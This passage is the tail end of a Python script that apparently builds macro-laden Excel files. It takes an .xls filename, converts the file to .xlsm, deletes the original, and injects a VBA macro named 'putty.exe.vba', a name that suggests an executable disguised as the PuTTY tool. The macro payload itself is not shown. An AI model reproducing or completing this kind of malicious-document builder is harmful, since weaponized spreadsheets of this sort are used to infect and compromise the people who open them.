    print("\033[1;77m[+] Created file '%s'." % (macro_name) + " \033[0m")
  
  excelfile = input("\033[1;77mInput Filename (.xls): \033[0m")
 
  excel_convert(excelfile, ".xlsm")
  os.remove(excelfile)
  excelMacro(excelfile.replace("xls","xlsm"), "putty.exe.vba")
  time.sleep(1)

if __name__ == '__main__':
  main() 